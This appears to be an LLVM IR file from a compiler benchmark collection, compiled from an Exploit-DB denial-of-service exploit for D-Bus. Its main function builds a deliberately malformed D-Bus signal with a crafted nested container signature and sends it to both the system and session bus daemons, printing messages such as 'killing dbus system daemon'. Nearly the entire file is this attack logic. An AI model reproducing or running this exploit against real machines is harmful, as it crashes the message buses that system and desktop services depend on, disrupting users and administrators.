; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_7822.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_7822.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [40 x i8] c"[+] creating malicious dbus message...\0A\00", align 1
@PATH = common dso_local global i32 0, align 4
@NAME = common dso_local global i32 0, align 4
@SIGNAL = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [42 x i8] c"[-] error: could not create dbus message\0A\00", align 1
@DEST = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [50 x i8] c"[-] error: could not create set dbus destination\0A\00", align 1
@DBUS_DICT_ENTRY_BEGIN_CHAR = common dso_local global i8 0, align 1
@DBUS_STRUCT_BEGIN_CHAR = common dso_local global i8 0, align 1
@DBUS_TYPE_INT32 = common dso_local global i8 0, align 1
@DBUS_STRUCT_END_CHAR = common dso_local global i8 0, align 1
@DBUS_DICT_ENTRY_END_CHAR = common dso_local global i8 0, align 1
@DBUS_TYPE_ARRAY = common dso_local global i32 0, align 4
@DBUS_TYPE_DICT_ENTRY = common dso_local global i32 0, align 4
@DBUS_TYPE_STRUCT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [41 x i8] c"[+] connecting to dbus system daemon...\0A\00", align 1
@DBUS_BUS_SYSTEM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [35 x i8] c"[+] killing dbus system daemon...\0A\00", align 1
@.str.5 = private unnamed_addr constant [52 x i8] c"[-] error: could not connect to dbus system daemon\0A\00", align 1
@.str.6 = private unnamed_addr constant [42 x i8] c"[+] connecting to dbus session daemon...\0A\00", align 1
@DBUS_BUS_SESSION = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [36 x i8] c"[+] killing dbus session daemon...\0A\00", align 1
@.str.8 = private unnamed_addr constant [53 x i8] c"[-] error: could not connect to dbus session daemon\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [8 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -559038737, i32* %7, align 4
  %15 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %16 = load i32, i32* @PATH, align 4
  %17 = load i32, i32* @NAME, align 4
  %18 = load i32, i32* @SIGNAL, align 4
  %19 = call i32* @dbus_message_new_signal(i32 %16, i32 %17, i32 %18)
  store i32* %19, i32** %8, align 8
  %20 = load i32*, i32** %8, align 8
  %21 = icmp ne i32* %20, null
  br i1 %21, label %24, label %22

22:                                               ; preds = %2
  %23 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %101

24:                                               ; preds = %2
  %25 = load i32*, i32** %8, align 8
  %26 = load i32, i32* @DEST, align 4
  %27 = call i32 @dbus_message_set_destination(i32* %25, i32 %26)
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %31, label %29

29:                                               ; preds = %24
  %30 = call i32 @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %101

31:                                               ; preds = %24
  %32 = load i8, i8* @DBUS_DICT_ENTRY_BEGIN_CHAR, align 1
  %33 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 0
  store i8 %32, i8* %33, align 1
  %34 = load i8, i8* @DBUS_STRUCT_BEGIN_CHAR, align 1
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 1
  store i8 %34, i8* %35, align 1
  %36 = load i8, i8* @DBUS_TYPE_INT32, align 1
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 2
  store i8 %36, i8* %37, align 1
  %38 = load i8, i8* @DBUS_TYPE_INT32, align 1
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 3
  store i8 %38, i8* %39, align 1
  %40 = load i8, i8* @DBUS_STRUCT_END_CHAR, align 1
  %41 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 4
  store i8 %40, i8* %41, align 1
  %42 = load i8, i8* @DBUS_TYPE_INT32, align 1
  %43 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 5
  store i8 %42, i8* %43, align 1
  %44 = load i8, i8* @DBUS_DICT_ENTRY_END_CHAR, align 1
  %45 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 6
  store i8 %44, i8* %45, align 1
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 7
  store i8 0, i8* %46, align 1
  %47 = load i32*, i32** %8, align 8
  %48 = call i32 @dbus_message_iter_init_append(i32* %47, i32* %11)
  %49 = load i32, i32* @DBUS_TYPE_ARRAY, align 4
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %6, i64 0, i64 0
  %51 = call i32 @dbus_message_iter_open_container(i32* %11, i32 %49, i8* %50, i32* %12)
  %52 = load i32, i32* @DBUS_TYPE_DICT_ENTRY, align 4
  %53 = call i32 @dbus_message_iter_open_container(i32* %12, i32 %52, i8* null, i32* %13)
  %54 = load i32, i32* @DBUS_TYPE_STRUCT, align 4
  %55 = call i32 @dbus_message_iter_open_container(i32* %13, i32 %54, i8* null, i32* %14)
  %56 = load i8, i8* @DBUS_TYPE_INT32, align 1
  %57 = call i32 @dbus_message_iter_append_basic(i32* %14, i8 signext %56, i32* %7)
  %58 = load i8, i8* @DBUS_TYPE_INT32, align 1
  %59 = call i32 @dbus_message_iter_append_basic(i32* %14, i8 signext %58, i32* %7)
  %60 = call i32 @dbus_message_iter_close_container(i32* %13, i32* %14)
  %61 = load i8, i8* @DBUS_TYPE_INT32, align 1
  %62 = call i32 @dbus_message_iter_append_basic(i32* %13, i8 signext %61, i32* %7)
  %63 = call i32 @dbus_message_iter_close_container(i32* %12, i32* %13)
  %64 = call i32 @dbus_message_iter_close_container(i32* %11, i32* %12)
  %65 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0))
  %66 = load i32, i32* @DBUS_BUS_SYSTEM, align 4
  %67 = call i32* @dbus_bus_get(i32 %66, i32* null)
  store i32* %67, i32** %9, align 8
  %68 = load i32*, i32** %9, align 8
  %69 = icmp ne i32* %68, null
  br i1 %69, label %70, label %79

70:                                               ; preds = %31
  %71 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  %72 = load i32*, i32** %9, align 8
  %73 = load i32*, i32** %8, align 8
  %74 = call i32 @dbus_connection_send(i32* %72, i32* %73, i32* null)
  %75 = load i32*, i32** %9, align 8
  %76 = call i32 @dbus_connection_flush(i32* %75)
  %77 = load i32*, i32** %9, align 8
  %78 = call i32 @dbus_connection_unref(i32* %77)
  br label %81

79:                                               ; preds = %31
  %80 = call i32 @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.5, i64 0, i64 0))
  br label %81

81:                                               ; preds = %79, %70
  %82 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.6, i64 0, i64 0))
  %83 = load i32, i32* @DBUS_BUS_SESSION, align 4
  %84 = call i32* @dbus_bus_get(i32 %83, i32* null)
  store i32* %84, i32** %10, align 8
  %85 = load i32*, i32** %10, align 8
  %86 = icmp ne i32* %85, null
  br i1 %86, label %87, label %96

87:                                               ; preds = %81
  %88 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.7, i64 0, i64 0))
  %89 = load i32*, i32** %10, align 8
  %90 = load i32*, i32** %8, align 8
  %91 = call i32 @dbus_connection_send(i32* %89, i32* %90, i32* null)
  %92 = load i32*, i32** %10, align 8
  %93 = call i32 @dbus_connection_flush(i32* %92)
  %94 = load i32*, i32** %10, align 8
  %95 = call i32 @dbus_connection_unref(i32* %94)
  br label %98

96:                                               ; preds = %81
  %97 = call i32 @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.8, i64 0, i64 0))
  br label %98

98:                                               ; preds = %96, %87
  %99 = load i32*, i32** %8, align 8
  %100 = call i32 @dbus_message_unref(i32* %99)
  store i32 0, i32* %3, align 4
  br label %101

101:                                              ; preds = %98, %29, %22
  %102 = load i32, i32* %3, align 4
  ret i32 %102
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32* @dbus_message_new_signal(i32, i32, i32) #1

declare dso_local i32 @dbus_message_set_destination(i32*, i32) #1

declare dso_local i32 @dbus_message_iter_init_append(i32*, i32*) #1

declare dso_local i32 @dbus_message_iter_open_container(i32*, i32, i8*, i32*) #1

declare dso_local i32 @dbus_message_iter_append_basic(i32*, i8 signext, i32*) #1

declare dso_local i32 @dbus_message_iter_close_container(i32*, i32*) #1

declare dso_local i32* @dbus_bus_get(i32, i32*) #1

declare dso_local i32 @dbus_connection_send(i32*, i32*, i32*) #1

declare dso_local i32 @dbus_connection_flush(i32*) #1

declare dso_local i32 @dbus_connection_unref(i32*) #1

declare dso_local i32 @dbus_message_unref(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
